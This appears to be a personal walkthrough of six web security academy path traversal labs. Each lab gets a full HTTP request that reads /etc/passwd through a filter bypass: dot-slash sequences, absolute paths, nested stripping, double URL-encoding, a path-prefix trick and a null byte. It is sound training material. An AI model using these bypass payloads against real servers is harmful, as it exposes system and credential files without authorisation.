---
tags:
  - path-traversal
level: apprentice
---
## 1. File path traversal, simple case

1. Ensure that images are included in burp history
2. Send one of the image requests to repeater
3. Send the following request to get the content of the `/etc/passwd` file

```
GET /image?filename=../../../etc/passwd HTTP/2
Host: 0a12002604cdbc6b81b23449008a0029.web-security-academy.net
Cookie: session=6ZZ2xrJt705tL0sdcajFPvKjtbWqtNoF
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0a12002604cdbc6b81b23449008a0029.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers


```

## 2. File path traversal, traversal sequences blocked with absolute path bypass

1. Note that path traversal sequences don't work. 
2. Send the following request to get `/etc/passwd` 

```
GET /image?filename=/etc/passwd HTTP/2
Host: 0a3b004d03cb9d6e8135a22e00530079.web-security-academy.net
Cookie: session=Rm7LTcmXM92MgIvRCZUU5MynxSFjoAlr
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0a3b004d03cb9d6e8135a22e00530079.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers


```

## 3. File path traversal, traversal sequences stripped non-recursively

1. Notice that path traversal sequences are stripped, but not recursively
2. Send the following request

```
GET /image?filename=....//....//....//etc/passwd HTTP/2
Host: 0a8b00650330c2818743e4f4002d00b1.web-security-academy.net
Cookie: session=NikEHg66JkoU5mpk5xFJh4tSFesn18Lp
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0a8b00650330c2818743e4f4002d00b1.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers


```

## 4. File path traversal, traversal sequences stripped with superfluous URL-decode

1. Note that normal path traversal sequences are stripped
2. Also note that URL-encoded paths don't work
3. Double URL-encode the path and note that it does work to get /etc/passwd and solve the lab

```
GET /image?filename=%252e%252e%2f%252e%252e%2f%252e%252e%2fetc%2fpasswd HTTP/2
Host: 0af300ca04055a8580ceef6500ec0034.web-security-academy.net
Cookie: session=PZZer83QyJ3MwzONn99LC2kKmfkkpe91
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0af300ca04055a8580ceef6500ec0034.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers
Connection: keep-alive

```

## 5. File path traversal, validation of start of path

1. Observe the original request and note that the path contains `/var/www/images/`.
2. Note that trying to get rid of that fails
3. Use the following request to get /etc/passwd

```
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: 0a4c003e03bb16e581f270ad00e300b3.web-security-academy.net
Cookie: session=s6UBkFolyMnqnr55wYTw2ZZQQ0lwykFk
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0a4c003e03bb16e581f270ad00e300b3.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers


```

## 6. File path traversal, validation of file extension with null byte bypass

1. Observe that the application expects a .jpg extension
2. Send the following request with a null-byte terminator to bypass the extension check

```
GET /image?filename=../../../etc/passwd%00.jpg HTTP/2
Host: 0ac500df0455683f81ef2a3300e400b8.web-security-academy.net
Cookie: session=YL7aXklMaf2Qg3CTkHFsjdlXSmcwFq9C
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0ac500df0455683f81ef2a3300e400b8.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers


```

